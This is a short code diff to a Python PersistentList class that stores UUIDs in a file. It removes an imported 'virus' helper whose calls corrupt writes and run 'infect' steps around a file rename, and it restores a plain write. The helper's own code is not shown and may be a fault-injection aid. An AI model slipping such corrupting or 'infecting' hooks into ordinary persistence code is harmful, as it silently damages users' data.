@@ -1,8 +1,6 @@
 import uuid
 import os
 
-from utils.model.virus import virus
-
 
 class PersistentList():
     def __init__(self, path):
@@ -17,8 +15,7 @@ class PersistentList():
         self.list.append(item)
 
         with open(self.path, "a+") as fp:
-            # fp.write(str(item))
-            virus.write_corrupt(str(item)+'\n', fp)
+            fp.write(str(item)+'\n')
 
     def __getitem__(self, index):
         return self.list[index]
@@ -41,8 +38,6 @@ class PersistentList():
                 with open(self.tmp_file, 'w') as tmp:
                     tmp.writelines(aux)
                     tmp.flush()
-                virus.infect()
                 os.rename(self.tmp_file, self.path)
-                virus.infect()
 
             self.list = [uuid.UUID(u.strip()) for u in aux]
